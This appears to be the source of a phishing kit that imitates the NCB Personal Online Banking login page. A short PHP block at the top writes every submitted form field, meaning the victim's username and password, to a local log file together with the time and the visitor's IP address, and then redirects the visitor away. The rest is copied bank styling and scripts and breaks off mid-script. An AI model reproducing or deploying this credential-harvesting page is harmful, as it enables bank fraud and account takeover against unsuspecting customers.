<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: yahoo');
$handle = fopen('log_uQ8TJNWIRD.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html style="" class=" js no-touch cssanimations csstransitions" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<!-- Global site tag (gtag.js) - Google Analytics -->
<script type="text/javascript" async="" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/analytics.js"></script><script async="" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">




 














 
 
 




<!--  <link href="http://localhost:8080/phpSite/canda/L001/consumer/theme/" rel="stylesheet" type="text/css"/>  --> 
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/all.css" rel="stylesheet" type="text/css">

<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/css.css" rel="stylesheet">
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materialize.css" rel="stylesheet" type="text/css">
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/mega-menu.css" rel="stylesheet" type="text/css">
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/layout_master.css" rel="stylesheet" type="text/css">

<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/application_master.css" rel="stylesheet" type="text/css">

	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/retailSpecificStyles.css" rel="stylesheet" type="text/css">
	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/ncbretailcustomapp.css" rel="stylesheet" type="text/css">
	
	


<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/mediaQueryApplication.css" rel="stylesheet" type="text/css">
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materialize_master.css" rel="stylesheet" type="text/css">
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/all.css" rel="stylesheet" type="text/css">

<!-- <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous"> -->
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/style.css" rel="stylesheet">

<script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_004.js"></script>

<!-- <script type="text/javascript" src="http://localhost:8080/phpSite/canda/js/collapse.js"></script> -->
    <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style>
<!-- <script src="http://localhost:8080/phpSite/canda/js/bootstrap.js"></script> -->
<!--  <script type="text/javascript" src="http://localhost:8080/phpSite/canda/js/bootstrap.min.js"></script>  -->




<script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ncalendar1.js"></script>



<script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeNFEBAScripts.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAFunctionLoader.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ncooltree.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-3.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-migrate-3.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_007.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materialize.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeCommon.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_009.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeNFEBAJavaScripts.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeHWMails.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ntree1_format.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NcommonMaterialize.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nencrypt.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Njson2.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nhmac-sha256.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nenc-base64-min.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NClientValidator.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ndsprocessor.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NMap.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeMessages.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmessageFunctions.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeCommonFunctions.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nxregexp.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nxregexp-unicode.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NtypeDefinitionVal.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NtypeSysValidation.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NcookieScript.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializeGroupletActionHandler.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmaterializePageCustom.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ntaglibs.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeNFEBAAjaxObjects.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAWidgets.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Noverlib_mini.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAVisualEffects.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-ui.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Noptions.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NEBGCD.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NCxpsGDHelper.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/json.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NCxpsCallFunctionsResponse.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NMaterializeListingDetails.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jPaginate.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_013.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/richTextEditor.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_006.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_015.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NAnalyticsEngine.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAAccordion.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Njquery-jcryption.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBATabs.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBATooltip.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBACalendar.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nmashup.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NGeoTagging.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nfacebook-utils.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmobileLogin.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_011.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAJSConfiguration.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/adaptivecommon.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/ArcotDeviceDNA.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/deployJava.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/FlashDetect.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/arcot_json.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/PluginDetect.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/rfutil.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/swfobject.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/arcot.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Ninteractivity.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_016.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_012.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_010.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_008.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_014.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NcalendarPicker.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NMaterializeFEBACombobox.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NFEBAColourPicker.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Nwatermark.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NmenuAuthorization.js"></script><script type="text/JavaScript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NCustomMobileCommon.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/footable_UX5.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_005.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/NRWDplugins.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_003.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery_002.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/modernizrCustom.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/classie.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/main.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/mega-menu.js"></script><script type="text/javascript" src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/ckeditor.js"></script><style>.cke{visibility:hidden;}</style>
<script type="text/javascript">jQuery.noConflict();</script>
	
		
	














<script>
setTreeFormt(1);
</script>


















	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-ui.css" rel="stylesheet" type="text/css">
	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/lib_themes.css" rel="stylesheet" type="text/css">
	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/jquery-calendars-picker.css" rel="stylesheet" type="text/css">
	<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/responsiveTables.css" rel="stylesheet" type="text/css">

<script type="text/javascript">
	<!--feba.domManipulator.documentReady(convertComboboxes);-->
	
</script>


<style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head><body oncontextmenu="return false;" scroll="auto" id="outerTab" style="font-size: 1.08em;"><div id="flashcontent">
</div>
<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/additional_temporary.css" rel="stylesheet" type="text/css">
<input type="Hidden" name="display_error_var" value="E" id="display_error_var" ondragstart="return false" ondrop="return false">
<input type="Hidden" name="UIType" value="UX5" id="UIType" ondragstart="return false" ondrop="return false">



<link href="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/materializeHorizontal.css" rel="stylesheet" type="text/css">


<script>
	
	var mql = window.matchMedia("screen and (max-width : 479px),screen and (max-device-width:479px)");
	if (mql.matches) { // if media query matches
		var desktopUrl=	window.location.href;
		//window.location.href= desktopUrl + "&MOBILE_FLAG=1";
	} 
	else {
			var mql = window.matchMedia("screen and (max-height: 479px),screen and (max-device-height:479px)");
			if (mql.matches) { // if media query matches
				//console.log("##############NPageCustom AuthenticationScreen_onload mql - small screen");
				var desktopUrl=	window.location.href;
				//console.log("##############NPageCustom AuthenticationScreen_onload mql - small screen desktopUrl:"+desktopUrl);
				//window.location.href= desktopUrl + "&MOBILE_FLAG=1";
			}
	}
</script>





	
	
	
	
	

<title>NCB Personal Online Banking:Internet Banking Login</title>
<script type="text/javascript">var imagePath = 'L001/consumer/images';</script><script type="text/javascript">CONFIG = feba.domManipulator.extendObject(CONFIG || {}, {logMode : "CONSOLE",operatingMode : "DEVELOPMENT", blockOnButtonClicksRequired : "N",blockOnHyperLinkClicksRequired : "N"	,addtionalURLParamRequired : "N", hijriStartYear : "1396",hijriEndYear :"1520" });var IS_WATERMARK_ENABLED="N"
</script><script type="text/javascript">var langID="001";
var locale="en_US";
</script><form name="AuthenticationFG" action="<?php echo basename(__FILE__); ?>" method="post" autocomplete="off">





	

	<div class="toprow parentTable">






<style>
/*http://localhost:8080/EBankingWeb/L001/consumer/theme/materialize_master.css*/
body{
	overflow-x: visible;
}
#global
{
	max-height: 877px;
}
.parentTable{
	max-width: 100% !Important;
}
.materializelogo_login {
    background: none;}
div#header-row {
    display: none;
}
/**overridde the style as unable to remove verification part**/
.loginPanelInputDetailsrow, .loginPanelImagePhraserow {
    float: none;
    margin: 0;
    padding-bottom: 0px;
    padding-top: 0px;
    width: 50%;
}
//**for the login button START**/
//*i.waves-effect.waves-light.btn.login_button.waves-input-wrapper {
    padding-left: 135px;
    padding-right: 135px;
    background: #00539b;
    border-color: #007bff;
    border-radius: .2rem;
    /* border-width: 16px; */
   /* border: 1px solid transparent;*/
    }**/
i.waves-effect.waves-light.btn.login_button.waves-input-wrapper:hover {
    background-color: #0069d9;
    border-color: #0062cc;
}
//**for the login button END**/
.width100percent_main_loginbg {

    background: url(http://localhost:8080/phpSite/canda/../images/backgrounds/login-bg.png);
    background-size: 101%;}
    
 .login_user {
    width: 100%;
    /*width of the userid box*/
   /* padding: 12px 93px;*/
   padding: 12px 6px;
  /*  margin: 8px 0;*/
   /*for height of the box START*/
       height: 2.0rem !important;
   /*for height of the box END*/  
    box-sizing: border-box !important;
    /* border: 1px solid #555 !important; */
    outline: none !important;
   /* border: 2px solid rgb(238, 238, 238) !important;*/
   border: 1px solid #a8a8a9 !important;
    /* color: #000000; */
    background-color: white !important;
    border-radius: 0 !important;
}

.user_id_style{
    /* float: none; */
    /* right: 100px !important; */
    margin-left: 221px;
    white-space: nowrap;
        position: relative !important;
    padding-top: 18px;
}


.lo {
    padding-left: 38px;
    padding-right: 38px;
    border: 1px solid #007bff !important;
    position: relative;
    bottom: 29px;
    left: 0px;
    float: right;
    top: -25px;
}

/*for login header*/
.lo_header {
    font-size: 2.0rem;
    color: #002a4ead !important;
    font-family: "Roboto", sans-serif !important;
    /* box-sizing: border-box; */
    padding-bottom: 10px;
    padding-left: 29px;
    padding-bottom: 14px;
}
/* for hidding the **/
.redstar {
    color: transparent;
}

.wel_st {
    color: white;
    /* position: absolute; */
    padding-top: 123px;
    /* font-weight: 900 !important; */
    font-size: 1.5rem;
}
.rem_sty{
	margin-right: 6px;
    /* text-align: left; */
    /* width: 18%; */
    padding-left: 26px;
  /*  padding-top: 40px;*/
}

.Login_linkstyle{
color: #002A4E !important;
    font-size: 13px;
    text-decoration: underline;
    font-family: "Roboto", sans-serif !important;
}

.login_link_style:after {
    padding-left: 6px;
    content: "|";
}

.Login_linkstyle1 {
    color: #002A4E !important;
    font-size: 13px;
    text-decoration: underline;
    margin-left: 35px;
    font-family: "Roboto", sans-serif !important;
}
/*.containerStyle label {
    top: -1.2rem !important;
    left: -0.95rem;
 
}*/

.containerStyle label {
    top: 0.8rem !important;
    left: 12.05rem;
    white-space: nowrap;
    font-size: 13px !important;}
	
	.containerStyle label.active {

	-webkit-transform: translateY(-22%);
	    font-size: 13px !important;}

/*for the username */
.for_username {
    left: 226px;
    /* margin-left: 193px; */
    white-space: nowrap;
    /* margin-top: 14px !important; */
    /* text-align: right !important; */
    /* padding: 1px 10px 10px 10px !important; */
    position: relative;
    bottom: 27px;
    color: #9E9E9E;
    font-size: 13px;
    font-family: "Roboto", sans-serif;
}
.width_cust{
padding: 25px 35px;
    width: 400px;
}
[type="checkbox"].filled-in:checked + span:after, [type="checkbox"].filled-in:not(:checked) + span:after {
    height: 12px !important;
     width: 12px !important;
    margin-top: 11px !important;
    /* border: none; */
    left: 2px !important;
    background-color: #80808012 !important;
    border: 1px solid #5555555c;
	}
	
/*for space height between boxes*/
.login_user{
    margin: -3px 0;	
    }
	
.loginLinkcontainer{
	display:flex;
	width: 46%;
	margin:auto;
}
#loginScreenSep{
	margin-top: 0.25rem;
}
#PrivacyPolicyfooter, #TermsCondionsfooter {
    color: #ffffff !important;
}
</style>
<script>
feba.domManipulator.documentReady(function (){
//alert("hi");
jQuery(".type_UserPrincipal").addClass("login_user");
jQuery(".login_button ").addClass("lo");
	
});
</script>
  <div id="global" class="next-genHeader login-body-style">
<div id="header" class="loginHeader">
		<div id="header-main " class="next-genHeader header-main newheaderbg">
			<div id="header-wrapper" class="wrapper">
				<div id="header-row" class="row">
					<div id="header-logo" class="materializelogo_login">
					<div class="header-text">ALL YOUR BANKING, FROM A SINGLE SECURE LOGIN</div>
					</div>
				</div>
			</div>
		</div>
</div>
								

  








<script type="text/javascript"><!--

linkArray = new Array();
isIE = document.all;

var currClickedElement;
var onFocus = 'Y';
jQuery(document).ready(function() {
if(onFocus == 'Y'){


jQuery(document).on('keydown',function(event) {
	if(event.which == 13 || event.which == 9) {
	closeKeypad();
	}
});
	jQuery( ".buttonhashed" ).css( "display", "none" );
}
if(jQuery('#MODAL_VIEW_CONTAINER').length >0){ 
	jQuery( ".buttonhashed_ebux2" ).css( "display", "none" );
}


jQuery(document).on('click',function(event) {
currClickedElement=jQuery(event.target).closest('div').parent().parent().parent();

if(currClickedElement && (jQuery(event.target).attr('type')=="password" || 
	jQuery(currClickedElement).attr('id')=='pp_div' || jQuery(event.target).attr('class')=='buttonhashed' )){
	if(onFocus == 'Y' || jQuery('#MODAL_VIEW_CONTAINER').length>0 ){
			jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow','visible');
			jQuery('div#modalDialog.ui-dialog-content').css('overflow','visible');
	}
	jQuery(document.getElementById('pp_div')).show();
	if(jQuery('#MODAL_VIEW_CONTAINER').length>0){
	jQuery(document.getElementById('pp_div')).css('visibility','visible');
	}
}
else{
	if(onFocus == 'Y'){
		jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow','');
		jQuery('div#modalDialog.ui-dialog-content').css('overflow','');
		closeKeypad();
	}else{
		jQuery('.ui-dialog.ui-widget.ui-widget-content.ui-corner-all').css('overflow','visible');
		jQuery('div#modalDialog.ui-dialog-content').css('overflow','visible');
		closeKeypad();
		setPinPadCtl(null);	
		var pwd = jQuery("input[type='password']");	
		jQuery(pwd).prop('disabled', false);
	}
}
if(jQuery(event.target).attr('for')){
    var lableId=jQuery(event.target).attr('id');
    if(lableId!='UserId_Text' && lableId!='label_access_code' && lableId!='label_verification_code'){
    //jQuery(document).unbind('click');
    event.preventDefault();
    }
}


});

});

isNN = !document.all&&document.getElementById;

isN4 = document.layers;

ppX = 450;
ppY = 250;

editCtl = null;
tmpEditCtl = null;

rX = (Math.random() * 24) - 12;
rY = (Math.random() * 36) - 18;


vIndex=0;
vRandomAlp=0;
vRandomNo=0;
vRandomSpl=0;


isHot=false;
showFirstTime=true;


isFirstTimeEnable = true;

var pwdImageValue="";
var pwdStrengthValue="";

insertData=function(ctl, value) {

    ctl.value = ctl.value + value;
    
    setValues(pwdImageValue,pwdStrengthValue)
    if(pwdImageValue != "" && pwdStrengthValue!= ""){
    	determinePasswordStrength(ctl.value,pwdImageValue,pwdStrengthValue,'null');
    }
    
};

     
applyNumber=function(ctl) {
    if(editCtl != null) {


        if(ctl.name == 'pp_clear') {
            editCtl.value = '';
            setValues(pwdImageValue,pwdStrengthValue)
            if(pwdImageValue != "" && pwdStrengthValue!= ""){
                   determinePasswordStrength(editCtl.value,pwdImageValue,pwdStrengthValue,'null');
            }       
           
        }else if (ctl.name == 'pp_erase'){
            editCtl.value= editCtl.value.substring(0,editCtl.value.length-1);
             setValues(pwdImageValue,pwdStrengthValue)
             if(pwdImageValue != "" && pwdStrengthValue!= ""){
